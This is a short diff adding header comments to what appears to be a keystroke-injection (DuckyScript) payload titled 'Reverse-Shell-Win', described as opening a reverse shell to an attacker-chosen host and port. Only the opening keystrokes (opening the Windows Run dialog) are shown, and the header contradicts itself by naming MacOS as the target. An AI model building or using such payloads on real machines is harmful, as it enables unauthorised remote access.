@@ -1,3 +1,11 @@
+REM     Title: Reverse-Shell-Win
+
+REM     Author: cbk914
+
+REM     Description: This payload is meant to open a reverse shell [Edit attacker-host and attacker-port]
+
+REM     Target: MacOS
+
 DELAY 1000
 GUI r
 DELAY 200
